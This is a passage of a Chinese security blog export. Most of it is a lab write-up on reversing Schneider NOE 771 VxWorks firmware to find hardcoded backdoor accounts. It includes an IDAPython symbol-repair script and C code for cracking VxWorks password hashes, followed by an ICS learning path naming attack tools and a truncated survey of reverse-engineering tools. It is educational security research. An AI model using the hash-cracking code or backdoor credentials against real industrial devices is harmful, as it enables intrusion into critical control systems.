title="2.VXworks"></a>2.VXworks</h3><p>本次实验的施耐德NOE771固件所使用的底层操作系统为Vxworks 5系列，CPU结构为PowerPC。<br>VxWorks操作系统是美国WindRiver公司于1983年设计开发的一种嵌入式实时操作系统（RTOS），它以其良好的可靠性和卓越的实时性被广泛地应用在通信、军事、航空及航天等高精尖技术领域中。甚至连1997年4月在火星表面登陆的火星探测器、2008年5月登陆的凤凰号，和2012年8月登陆的好奇号也都使用到了VxWorks系统。</p><h3 id="3-固件识别和解压"><a href="#3-固件识别和解压" class="headerlink" title="3.固件识别和解压"></a>3.固件识别和解压</h3><p>固件的识别和解压，可以借用一些成熟的工具软件，如：Binwalk、BAT（Binary AnalysisToolkit）等。Binwalk和BAT均为比较流行的固件映像提取和分析工具。Binwalk以MIT License发布，BAT以GPL License发布。它们支持的固件映像解压格式对比表如下：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3lb0otwj30n409w4qp.jpg" alt="img"><br>对于常见的嵌入式设备固件可以使用Binwalk或BAT来解压并提取固件文件。对于无法自动解压的固件，可以尝试以下方法分析：使用文件分析工具获得固件映像文件的基本数据类型。<br>使用字符串打印工具提取文件中所包含的明码字段，寻找是否有引导装载程序以及操作系统内核的信息。<br>使用十六进制转储工具（如hexdump）分析为了对齐固件文件空间分段而放入的连续填充字节，文件系统标识有可能紧跟其后。<br>文件系统有可能使用非标准的特征符，如果发现可疑特征符字段，可以替换为标准特征符，再尝试由固件解压工具进行识别。</p><h3 id="4-固件静态分析"><a href="#4-固件静态分析" class="headerlink" title="4.固件静态分析"></a>4.固件静态分析</h3><p>固件静态分析指的是在不对嵌入式系统进行实际运行的情况下，通过对固件文件进行逆向解析，分析固件中各代码的调用关系及代码内容从而发现嵌入式系统可能存在的漏洞及后门或针对已发现的漏洞进行定位的一种技术手段。固件静态分析过程中将会涉及到固件提取、加载地址分析等各种分析技术。<br>固件解压之后的分析主要集中在对常见漏洞入口进行针对性的静态分析，包括：密码、默认开启的服务、端口、配置文件等。分析方法如下：</p><p>1）尝试提取文件中包含的明码字段是否存在硬编码密码等。</p><p>2）发掘固件的关联性，包括分析固件作者、库使用、目录结构、配置文件关键字、定制默认密码等信息。</p><p>3）对二进制可执行文件进行反汇编分析，可以借用一些成熟的工具软件，如：IDA Pro、Capstone等。对特定的嵌入式系统（如VxWorks）的登录模块进行反汇编分析，获取其登录密码的哈希算法等信息。</p><p>4）如果发现包含密码哈希的文件，可考虑使用John the Ripper或Hash Suite等工具进行暴力破解。前者有版本支持GPU加速（支持CUDA和OpenCL）。使用暴力破解工具可以利用前述步骤中提取的关键字，显著加快运行效率。</p><h3 id="5-IDA-Pro"><a href="#5-IDA-Pro" class="headerlink" title="5.IDA Pro"></a>5.IDA Pro</h3><p>IDA Pro是应用最广泛的静态反汇编工具，它支持对大量的CPU架构进行逆向分析，包括X86、MIPS、PowerPC及Arm等。</p><h3 id="6-Capstone"><a href="#6-Capstone" class="headerlink" title="6.Capstone"></a>6.Capstone</h3><p>Capstone是一个反汇编框架，它支持多种平台，能够运行在Windows、Mac OS X、Linux、FreeBSD、OpenBSD和Solaris中。Capstone可反汇编ARM、ARM64(ARMv8)、MIPS、PPC和X86架构下的应用。</p><h2 id="【实验环境】"><a href="#【实验环境】" class="headerlink" title="【实验环境】"></a>【实验环境】</h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3ndb967j30jy0e040v.jpg" alt="image-20191029152459378"></p><p>主机操作系统：Windows、Linux、macOS选其一</p><p>主机虚拟机：VMware、VirtualBox、KVM选其一</p><p>Windows XP：IDA Pro</p><p>Kali Linux：Metasploit、Python、Capstone等</p><h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><h3 id="1-实验准备"><a href="#1-实验准备" class="headerlink" title="1.实验准备"></a>1.实验准备</h3><p>准备好部署有IDA Pro的Windows虚拟机，以及可以使用binwalk、python、十六进制编辑器的环境，例如Kali虚拟机，确保虚机可以方便的进行文件拷贝，也可以使用文件服务器的方式进行共享。准备Vxworks相关文献资料，必要的时候可以直接进行查阅。</p><h3 id="2-获取固件升级包"><a href="#2-获取固件升级包" class="headerlink" title="2.获取固件升级包"></a>2.获取固件升级包</h3><p>在通常情况下，我们通过官网获取到的固件升级包，是一个包含了嵌入式固件的一个升级包。我们需要从该升级包中将真正的固件提取出来进行分析。<br>从施耐德官方网站下载固件升级包，从该升级包中提取固件文件。NOE 771的固件文件名为NOE77101.bin。</p><h3 id="3-识别和解压升级包"><a href="#3-识别和解压升级包" class="headerlink" title="3.识别和解压升级包"></a>3.识别和解压升级包</h3><p>提取固件通常的方法是使用Binwalk等二进制分析工具对固件升级包进行自动化分析，待确认升级包类型后在进行解压或其他操作。<br>NOE771的固件文件名为NOE77101.bin，首先我们需要使用Binwalk来确认该文件的类型。通过使用Binwalk进行自动分析可以发现，该固件升级包包含了一个zlib压缩的文件。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3vpmszhj313u0l3nop.jpg" alt="截屏2019-10-28下午8.06.00"></p><p>Binwalk支持提取zlib压缩的文件，我们可以通过如下命令进行解压</p><pre><code>Binwalk-e NOE77101.bin</code></pre><p>解压后的文件385将存储在_NOE77101.bin.extracted目录中，并以文件在固件升级包中的起始位置来命名。</p><p>下图为解压固件升级包结果。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3xj7a19j313u0l3noz.jpg" alt="截屏2019-10-28下午8.06.53"></p><h3 id="4-固件提取"><a href="#4-固件提取" class="headerlink" title="4.固件提取"></a>4.固件提取</h3><p>通过继续使用Binwalk对解压后的385文件进行分析可见，Binwalk已成功的分析出了固件中的一些路径名等信息，由此可见该文件的确是NOE771所加载的固件文件。</p><p>下图查看固件主要文件路径和程序结构以及版本信息。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3yz2jcwj313u0l3k8y.jpg" alt="截屏2019-10-28下午8.08.18"></p><h3 id="5-分析固件内存加载地址"><a href="#5-分析固件内存加载地址" class="headerlink" title="5.分析固件内存加载地址"></a>5.分析固件内存加载地址</h3><p>由于嵌入式系统的固件需要加载到内存中的特定位置进行运行，这个特定的位置就叫做固件加载地址（base address）。<br>嵌入式系统的固件内的一些绝对地址调用（例如字符串）均是基于固件加载地址所计算出的内存地址，而不是固件文件中的偏移量地址。例如某函数调用了内存位置为0x30000的字符指针，且我们的固件加载地址为0x10000，那么该字符串在固件文件中的实际位置就是“内存位置”-“固件加载地址”，也就是0x20000。<br>因此为了使IDA能够正确的对代码进行解析，我们需要分析出固件的加载地址，否则所有涉及到绝对地址调用的代码解析都将是错误的。</p><p>某些固件会采用一些封装，比较典型的封装方法是使用ELF封装。通过封装后的ELF文件头部有特定的数据位记录了该固件的加载地址，因此针对该情况我们可以直接读取ELF文件头，从而直接获取到固件的加载地址。<br>ELF的全称是Executable and Linkable Format，常被称为ELF格式。通过使用greadelf之类的工具可以轻松的获取ELF文件的信息。<br>由于NOE771的固件并没有采用任何封装，因此针对NOE771的固件我们将通过分析固件头部的代码来大致猜测固件的加载地址。<br>使用IDA Pro分析嵌入式系统固件的话，首先我们需要确认目标的CPU类型从而选择正确的反汇编引擎。我们可以通过使用Binwalk–A命令来分析。<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f41ie2mjj313u0l37r9.jpg" alt="截屏2019-10-28下午8.52.39"><br>在得知了目标CPU架构是PowerPC big endian后我们就可以只用IDA加载并进行初步分析。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f45s1a5kj31390nz4i1.jpg" alt="image-20191029154240162"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f466injcj31390nzqmt.jpg" alt="image-20191029154303971"></p><p>IDA Pro进行正确的固件加载默认加载后的IDA界面看起来像是这样的。仅仅分析出了极少数的函数</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f47kj0g6j31390nz7bl.jpg" alt="image-20191029154424149"></p><p>虽然现在我们可以成功反编译，但我们还需要确定固件的代码段基址才能重构符号表<br>确定基址的思路是寻找一条相对寻址方式的lis指令。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4aykgsaj30mb0150mh.jpg" alt="5b5021411a2fa"></p><p>在IDA中使用ALT+T直接搜lis指令，CTRL+T进行向下(上)搜索，发现在000009F8处的lis指令</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4c3yajoj31d10lawol.jpg" alt="截屏2019-10-28下午9.42.56"></p><p>观察地址后面的@ha确定基址为0x10000,这也是固件常用基址</p><p>对@h和@ha的问题，可以看下图<img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4dmpoz8j30rv0anaam.jpg" alt="5b50214142c8e"></p><p>这是powerPC汇编的特性问题，可以参考以下这篇文章：</p><p><a href="http://blog.chinaunix.net/uid-20663797-id-35772.html">http://blog.chinaunix.net/uid-20663797-id-35772.html</a></p><p>现在我们就需要验证0x10000是否是我们真正的加载地址了。我们需要重新使用IDAPro加载固件文件，并按照下图进行配置。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4i4e78jj31d10lae7l.jpg" alt=" "></p><p>配置正确的内存开始和加载地址完成后我们就可以看到IDA Pro能够正常的分析固件的函数调用关系了。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4kviinoj31390nzahs.jpg" alt="image-20191029155711712"></p><h3 id="6-利用符号表修复IDA中的函数名"><a href="#6-利用符号表修复IDA中的函数名" class="headerlink" title="6.利用符号表修复IDA中的函数名"></a>6.利用符号表修复IDA中的函数名</h3><p>如之前所看到的，IDA虽然成功分析出了函数的调用关系。但是尚无法自动识别出函数的名字，这对我们进行分析造成了很大的阻碍。因此我们需要查看固件是否包含了符号表，如固件包含了符号表那么我们就可以利用符号表中的内容来修复IDA中所显示的函数名。<br>符号表（Symbol table）是一种用于语言翻译器中的数据结构，在符号表中，程序源代码中的每个标识符都和它的声明或使用信息绑定在一起，比如其数据类型、作用域以及内存地址。在Vxworks中如果没有符号表我们将不能在shell中执行任何命令，因为Vxworks不知道命令名所对应代码的具体位置。<br>由于Vxworks系统的符号表包含了函数及函数名的对应关系，因此我们的第一步就是要找到符号表在固件中的位置。<br>之前使用Binwalk分析固件时，已经发现了固件中的符号表位置为0x301E74。</p><p>在获取了符号表在固件中的位置后，我们就可以使用16进制编辑器对固件进行查看从而确认Binwalk分析出的地址是否正确。<br>Vxworks 5系列的符号有他独特的格式，他以16个字节为一组数据，前4个字节是0x00，之后是函数名的内存地址，后4个字节是函数的内存地址，最后以4个特征字节数据结尾。<br>通过查看Binwalk分析出的地址位置可见，这个地址的确是符号表但是Binwalk的检测结果有一些偏移实际的符号表起始位置是0x301e60。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4ney6vkj31d10la4qp.jpg" alt="截屏2019-10-29上午10.07.44"></p><p>由于符号表有他自己的特征，因此能够通过遍历的方式快速的锁定符号表的起始及结束地址。我们所测试的固件的符号表起始地址为0x301e60+0x10000，结束地址为0x3293b0+0x10000。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4nnqbq2j31d10la1kx.jpg" alt="截屏2019-10-29上午10.09.54"></p><p>在得到了符号表的位置后，我们就需要使用IDA的api来修复函数名，这里将使用如下的Python脚本。</p><pre><code class="python"># coding:utf-8from idaapi import *# 符号表间隔symbol_interval = 16load_address = 0x10000symbol_table_start = 0x301e60 + load_addresssymbol_table_end = 0x3293b0 + load_addressea = symbol_table_startwhile ea &lt; symbol_table_end:    # 循环遍历修复函数名    offset = 4    MakeStr(Dword(ea + offset), BADADDR)    sName = GetString(Dword(ea + offset), -1, ASCSTR_C)    print(sName)    if sName:        eaFunc = Dword(ea + offset + 4)        MakeName(eaFunc, sName)        MakeCode(eaFunc)        MakeFunction(eaFunc, BADADDR)    ea += symbol_interval</code></pre><p>在IDA的脚本中运行</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4wi7rsrj30m40frdm5.jpg" alt="截屏2019-10-29上午10.23.47"></p><p>运行之后发现旁边函数列表大多函数都找到了符号表中对应的名称</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4xwb6loj31390nzqd7.jpg" alt="image-20191029160942747"></p><h3 id="7-后门代码分析"><a href="#7-后门代码分析" class="headerlink" title="7.后门代码分析"></a>7.后门代码分析</h3><p>在固件预处理完成后，我们就可以通过查看固件的服务加载过程查看初始化时所添加的账号等信息。查看usrAppinit函数，可以发现大量的loginUserAddd调用。（多个后门函数）</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f504uq6hj31390nzgyc.jpg" alt="截屏2019-10-29上午11.03.43"></p><p>而密码则是经过loginDefaultEncrypt函数哈希加密<br>结合vxworks5的源码来看</p><pre><code class="c">/******************************************************************************** loginDefaultEncrypt - default password encryption routine** This routine provides default encryption for login passwords.  It employs* a simple encryption algorithm.  It takes as arguments a string &lt;in&gt; and a* pointer to a buffer &lt;out&gt;.  The encrypted string is then stored in the* buffer.** The input strings must be at least 8 characters and no more than 40* characters.** If a more sophisticated encryption algorithm is needed, this routine can* be replaced, as long as the new encryption routine retains the same* declarations as the default routine.  The routine vxencrypt* in \f3host/&lt;hostOs&gt;/bin\fP* should also be replaced by a host version of &lt;encryptionRoutine&gt;.  For more* information, see the manual entry for loginEncryptInstall().** RETURNS: OK, or ERROR if the password is invalid.** SEE ALSO: loginEncryptInstall(), vxencrypt** INTERNAL* The encryption is done by summing the password and multiplying it by* a magic number.*/STATUS loginDefaultEncrypt    (    char *in,                           /* input string */    char *out                           /* encrypted string */    )    &#123;    int            ix;    unsigned long  magic     = 31695317;    unsigned long  passwdInt = 0;   if (strlen (in) &lt; 8 || strlen (in) &gt; 40)        &#123;    errnoSet (S_loginLib_INVALID_PASSWORD);        return (ERROR);        &#125;    for (ix = 0; ix &lt; strlen(in); ix++)         /* sum the string */        passwdInt += (in[ix]) * (ix+1) ^ (ix+1);    sprintf (out, &quot;%u&quot;, (long) (passwdInt * magic)); /* convert interger                            to string */    /* make encrypted passwd printable */    for (ix = 0; ix &lt; strlen (out); ix++)        &#123;        if (out[ix] &lt; &#39;3&#39;)            out[ix] = out[ix] + &#39;!&#39;;    /* arbitrary */        if (out[ix] &lt; &#39;7&#39;)            out[ix] = out[ix] + &#39;/&#39;;    /* arbitrary */        if (out[ix] &lt; &#39;9&#39;)            out[ix] = out[ix] + &#39;B&#39;;    /* arbitrary */        &#125;    return (OK);    &#125;</code></pre><p><a href="https://i.loli.net/2018/07/19/5b5021f38a71a.jpg"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f58cr8q2j30od0jaaaq.jpg" alt="mark"></a><br><a href="https://i.loli.net/2018/07/19/5b5021f39f749.jpg"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f58ej37bj30og0hsq43.jpg" alt="mark"></a><br><a href="https://i.loli.net/2018/07/19/5b5021f3b3958.jpg"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8f58gdnqwj30oo0ekwex.jpg" alt="mark"></a></p><p>结合源码看汇编就非常清晰了</p><blockquote><p>加密过程：</p><p>1.在第一个for循环中密码字符串逐字节与位置下标相乘再按位进行异或操作，然后将每一个字符的运算结果累加起来算出passwdInt。<br>2.passwdInt值与magic相乘再转化为String类型。<br>3.字符串逐字符与’3’、’7’、’9’进行比较，加相应的值。</p><p>可以通过随机生成密码来构建一个序列化的输入密码和passwdInt的对应表，同时passwdInt与输出密码之间也可构建对应表，这样输入密码和输出密码讲通过长度有限的Int类型passwdInt打通，这样我们就能通过查表的方式由输出密码得到输入密码。相比于MD5、SHA1等加密算法，vxencrypt加密算法由于加密方式问题导致密文长度受限，以至于存在弱点。</p></blockquote><p>Rapid7 研究员HD Moore曾经发现VxWorks 5.x系统默认加密方式存在缺陷的研究文章</p><blockquote><p><a href="https://cvk.posthaven.com/how-to-crack-vxworks-password-hashes">http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes</a></p></blockquote><p>解密程序</p><blockquote><p><a href="https://github.com/cvonkleist/vxworks_hash">https://github.com/cvonkleist/vxworks_hash</a></p></blockquote><p>这里贴上C的</p><pre><code class="c">// cvk/2010-08-09#include &lt;stdio.h&gt;#include &lt;string.h&gt;// password settings#define MIN_LENGTH 8#define MAX_LENGTH 40char *charset = &quot; !\&quot;#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;;#define CHARSET_LENGTH 95// shortcut hash table#define MAX_SUM 110000char sums[MAX_SUM][MAX_LENGTH + 1];// stage one of the hashing algorithm: the sumunsigned long sum(char *plaintext) &#123;  unsigned long s = 0;  int i;  for (i = 0; i &lt; strlen(plaintext); i++)    s += (plaintext[i]) * (i + 1) ^ (i + 1);  return s;&#125;// builds a random passwordvoid random_password(char *password) &#123;  int i;  int length = rand() % (MAX_LENGTH - MIN_LENGTH) + MIN_LENGTH;  for(i = 0; i &lt; length; i++)    password[i] = charset[rand() % CHARSET_LENGTH];  password[length] = &#39;\0&#39;;&#125;// randomly creates checksums//// when it discovers a shorter input plaintext for a checksum that has already// been calculated, it replaces the existing plaintext with the new, shorter// onevoid brute(int runs) &#123;  int i;  char password[MAX_LENGTH + 1];  unsigned long s;  for(i = 0; i &lt; runs; i++) &#123;    random_password(password);    s = sum(password);    if(s &gt; MAX_SUM) &#123;      printf(&quot;error! sum too big&quot;);      return;    &#125;    if(sums[s][0] == &#39;\0&#39; || strlen(password) &lt; strlen(sums[s])) &#123;      strcpy(sums[s], password);    &#125;  &#125;&#125;// returns the number of checksums in the tableint count() &#123;  int i;  int c = 0;  for(i = 0; i &lt; MAX_SUM; i++)    if(sums[i][0] != &#39;\0&#39;)      c++;  return c;&#125;// prints discovered checksumsvoid dump_table() &#123;  int i;  for(i = 0; i &lt; MAX_SUM; i++)    if(sums[i][0] != &#39;\0&#39;)      printf(&quot;%d\t%s\n&quot;, i, sums[i]);&#125;int main(int argc, char **argv) &#123;  brute(1000000000);  printf(&quot;%d checksums\n&quot;, count());  dump_table();&#125;</code></pre><h2 id="【预期结果】"><a href="#【预期结果】" class="headerlink" title="【预期结果】"></a>【预期结果】</h2><p>成功找到隐藏在固件封装程序中的若干个后门账号和密码</p><h2 id="【思考问题】"><a href="#【思考问题】" class="headerlink" title="【思考问题】"></a>【思考问题】</h2><p>（1）如果固件的内存加载地址并没有采用一般默认的0x10000，我们有哪些可能的办法去寻找其加载地址呢？</p><p>（2）除了本实验中提到的办法，还有什么其他思路可以找到固件的符号表地址？</p><p>（3）尝试下载工业控制安全教学实验箱中相关设备的固件进行后门分析，包括交换机、工业防火墙、施耐德PLC、西门子PLC和HMI。</p><h2 id="【参考资料】"><a href="#【参考资料】" class="headerlink" title="【参考资料】"></a>【参考资料】</h2><p><a href="https://www.cnblogs.com/yangmzh3/p/11231423.html">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p><p><a href="https://paper.seebug.org/771/">https://paper.seebug.org/771/</a></p><p><a href="https://paper.seebug.org/613/">https://paper.seebug.org/613/</a></p><p><a href="https://www.cnblogs.com/hac425/p/9706815.html">https://www.cnblogs.com/hac425/p/9706815.html</a></p><p><a href="http://www.360doc.com/content/15/1018/18/471722_506538709.shtml">http://www.360doc.com/content/15/1018/18/471722_506538709.shtml</a></p><p><a href="https://www.jianshu.com/p/12d8f509169c">https://www.jianshu.com/p/12d8f509169c</a></p><p><a href="http://t.cn/RdORUWo">http://t.cn/RdORUWo</a></p><p><a href="https://kabeor.cn/%E6%96%BD%E8%80%90%E5%BE%B7NOE77101%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%A8%A1%E5%9D%97%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%8F%8A%E5%90%8E%E9%97%A8%E6%8C%96%E6%8E%98/">https://kabeor.cn/施耐德NOE77101以太网模块固件逆向及后门挖掘/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 固件逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工控学习路径</title>
      <link href="2019/10/27/%E5%B7%A5%E6%8E%A7%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/"/>
      <url>2019/10/27/%E5%B7%A5%E6%8E%A7%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<p>工业控制系统概述<br>目的：简单的了解什么是工业控制系统、工业控制系统框架、工业控制系统安全现状等理论基础知识，在对工业控制系统有了一定的了解后在展开实践。</p><a id="more"></a><p>学习方法：通过网上搜集相关资料进行学习，最好直接看一些工控安全的相关书籍，书籍里都讲的很清楚。下面推荐几本入门书籍：<br>1.《黑客大曝光：工业控制系统安全》<br>2.《工业控制网络安全技术与实践》<br>3.《S7-300/400 PLC应用技术》<br>4……</p><p>工业控制系统的组态和编程<br>目的：了解PLC的架构与特点，认识PLC的硬件及网络组态、学习PLC程序的基础编写，使用TIA对S7-300进行硬件组态和PLC编程。<br>学习方法：学会控制器的组态方法，多看说明文档，能够读懂简单的梯形图控制逻辑和其他的基于IEC61131-3的五种工控编程语言，并进行简单的编程，使用真实的PLC设备进行实操，如国内外的PLC，西门子、施耐德、ABB、和利时、大工计控、优稳……（一般入门都是从西门子的PLC开始）设备能够跑起来是第一步，接下来就可以做一些事了。</p><p>常用的工业控制系统协议分析<br>要求：分析常用的工业以太网协议，如Modbus、S7comm、IEC61850、EtherNet/IP、DNP3、EPA等等协议，了解这些工业以太网协议的协议规范和存在的安全性问题。<br>学习方法：有真实设备的可以直接使用真实设备进行分析、无真实设备的可以从网上下载相关的协议数据包进行离线分析，通过对协议的不断了解，要形成对这些协议的模糊测试工具。</p><p>工控软硬件漏洞挖掘<br>工业控制系统的漏洞挖掘主要包含三部分，上位机软件漏洞挖掘、工控协议的漏洞挖掘，控制器设备固件漏洞挖掘。其中最简单的是工控协议漏洞挖掘，上手比较快，需要具备一定的工控协议逆向能力，其他两方面需要一定的基础才能精心研究。<br>学习方法：首先对协议进行分析，然后编写模糊测试脚本，最后进行测试和分析。开始研究是可以找一些已有的漏洞，先复现他的攻击过程，在分析器攻击机理，从而能够举一反三，发掘0day漏洞。</p><p>工控系统攻击工具使用<br>想要做一些工控安全的研究，光靠自己琢磨效率低下，需要借助前人已有的成果进行研究和学习。其中涉及到很多实用的工具，我们需要建立自己的工具集，这里列出一些常用的工具：<br>（1）S7 Client Demo开源的S7协议库”snap7“基础上进行开发的，主要支持西门子的S7-300/s7-400设备，可以直接连接西门子的控制器，获取控制器上的设备信息（如固件版本，块信息等），还可以直接操作控制器的CPU的启停。<br>（2）PLCSCAN、NMAP中的工控设备扫描模块通过探测设备，获取关于设备的供应商类型、模块信息等，目前仅支持S7协议与MODBUS协议。<br>（3）ISF该框架主要使用Python语言开发，集成了ShadowBroker释放的NSA工具Fuzzbunch攻击框架，是一款适合工控漏洞利用的框架。其中集成很多常用的针对工控安全的攻击集。<br>（4）GrassMarlinGRASSMARLIN是一款由美国国家安全局开发的，能够帮助运维工程师在IP网络上发现并编目监控和数据采集系统（SCADA）和工业控制系统（ICS）主机的开源软件工具，也被称为被动网络映射器。其数据源十分多样化，包括PCAP文件、路由器和交换机配置文件、CAM表以及实时网络数据包的捕获。该工具能够自动识别可用网络，生成网络拓扑，实现主机间通信的可视化，还能够展示从主机通信中所提取的元数据。<br>（5）S7-Brute-OfflineS7密码离线暴力破解工具。<br>（6）SCADA_Metasploit_Modules列举了MSF上所有的针对工业控制系统的漏洞脚本。<br>（7）Scada_Password列举了工业控制系统中的常见的用户和密码。<br>（8）SmodModbus模糊测试工具。<br>（9）PLCinject<br>（10）Modscan<br>（11）…<br>这里就不一一列举了，用到的使用自己去找吧，最后我这里给出几个github上对工控资源整合的网站：<br><a href="https://github.com/zhangdebiao/icsmaster">https://github.com/zhangdebiao/icsmaster</a><br><a href="https://github.com/zhangdebiao/ICS-Security-Tools">https://github.com/zhangdebiao/ICS-Security-Tools</a><br><a href="https://github.com/zhangdebiao/awesome-industrial-control-system-security">https://github.com/zhangdebiao/awesome-industrial-control-system-security</a>    FREEBUF<br>这几个链接中整合了国内外和工控安全相关的顶会文章，工控系统的利用脚本、常用的攻击工具、工控协议相关的数据包和协议文档等等。</p>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见二进制逆向工具总结</title>
      <link href="2019/10/26/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
      <url>2019/10/26/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><h3 id="预处理工具"><a href="#预处理工具" class="headerlink" title="预处理工具"></a>预处理工具</h3><ol><li>脱壳工具</li></ol><p>目前有很多加壳工具，当然有盾，自然就有矛。软件脱壳有手动脱和自动脱壳之分，其中手动是用TRW2000、TR、SOFTICE等调试工具对付，对脱壳者有一定水平要求，涉及到很多汇编语言和软件调试方面的知识。自动就是用专门的脱壳工具来脱，最常用某种压缩软件都有编写的反压缩工具对应，有些压缩工具自身能解压，如UPX。有些不提供这功能，如：ASPACK，需要UNASPACK来脱壳。更一般的需要专门的脱壳工具来解决，使用比较多的是PROCDUMP，可解决目前各种主流压缩软件的压缩文件。</p><a id="more"></a><p>也就是说脱壳工具一般分为专用的和通用的脱壳机,通用脱壳机是根据外壳的类型或模拟执行进行脱壳,通用脱壳机能脱的壳较多,但是效果不好,专用脱壳机只能针对某一个壳(甚至是某一个壳的具体版本)进行脱壳,虽然它只能脱单一的一种壳,但是由于它的针对性特别强,因此脱壳的效果较好。下面介绍两种通用的脱壳工具：</p><p>a. linxerUnpacker</p><p>linxerUnpacker是一个通用型自脱工具，由linxer编写发布。它完全基于虚拟机，将壳特征和编译器特征保存在PEid_Sign.txt里面，可以自动脱几十种主流的壳。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1oei4qj30os0jon2g.jpg" alt="img"> </p><p>b. FFI万能脱壳</p><p>本工具是一款辅助进行病毒分析的工具，它包括各种文件格式识别功能，使用超级巡警的格式识别引擎，集查壳、虚拟机脱壳、PE文件编辑、PE文件重建、导入表抓取(内置虚拟机解密某些加密导入表)、进程内存查看/DUMP、附加数据处理、文件地址转换、PEID插件支持、MD5计算以及快捷的第三方工具利用等功能，适合病毒分析中对一些病毒木马样本进行系统处理。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1qqmtaj31880ootl6.jpg" alt="img"> </p><ol start="2"><li>定位地址工具</li></ol><p>a.Dependency Walker</p><p>Dependency Walker是一个免费的实用程序，在Windows 95、98，Me，NT，2000，XP，2003，Vista，7和8上运行,可扫描任何32位或64位Windows模块（exe，dll，ocx，sys等），并构建所有从属模块的层次树状图。对于找到的每个模块的地址有巨大的帮助，它列出了该模块导出的所有功能，以及其他模块实际上正在调用的功能。另一个视图显示最少的必需文件集，以及有关每个文件的详细信息，包括文件的完整路径，基地址，版本号，计算机类型，调试信息等。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1vweapj313c0u0e3g.jpg" alt="img"> </p><p>b.LoadPE</p><p>LordPE是一款功能强大的PE文件分析、修改工具，可以查看PE格式文件格式，并修改相关信息。</p><p>LordPE可以解析PE文件结构，对PE文件头部结构内容进行查看分析。可以解析各字段特征值的含义，并对特征值进行操作更改。也可以解析PE文件导入导出表结构，分析PE文件的导入函数及导出函数信息。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1q9kqqj316k0i811c.jpg" alt="img"> </p><p>c.Stud_PE</p><p> StudPE是一个功能强大的PE文件格式编辑工具,它可以解析PE文件格式,可以进行文件格式的比较,可以进行壳的识别等。它还提供了支持插件的功能，内置十六进制编辑器，可对资源进行修改。拥有可视化资源查看器，可修改、替换、导出文件；添加函数、修改区段、查看程序进程等等；</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1oxsudj31440u0nf3.jpg" alt="img"> </p><ol start="3"><li>地址计算工具</li></ol><p>a. 逆向工程计算器（Reversers Calculator ）</p><p>Reversers Calculator 是一个 32 位十六进制基础逆向计算工具，支持十六进制逻辑和数学运算，支持将十六进制和二进制转换为十进制（有/无符号）和八进制结果，并可将字符串转换为十六进制值。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1r73yoj30xw0rsamc.jpg" alt="img"> </p><h3 id="动态分析工具"><a href="#动态分析工具" class="headerlink" title="动态分析工具"></a>动态分析工具</h3><p>a. Windbg</p><p>WinDbg是在windows平台下，强大的用户态和内核态调试工具。它能够通过dmp文件轻松的定位到问题根源，可用于分析蓝屏、程序崩溃（IE崩溃）原因，是我们日常工作中必不可少的一个有力工具，学会使用它，将有效提升我们的问题解决效率和准确率。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1pfijpj31bb0u0ww1.jpg" alt="img"> </p><p>c. OllyDbg</p><p>OllyDbg（简称OD）是有Oleh Yuschuuk（<a 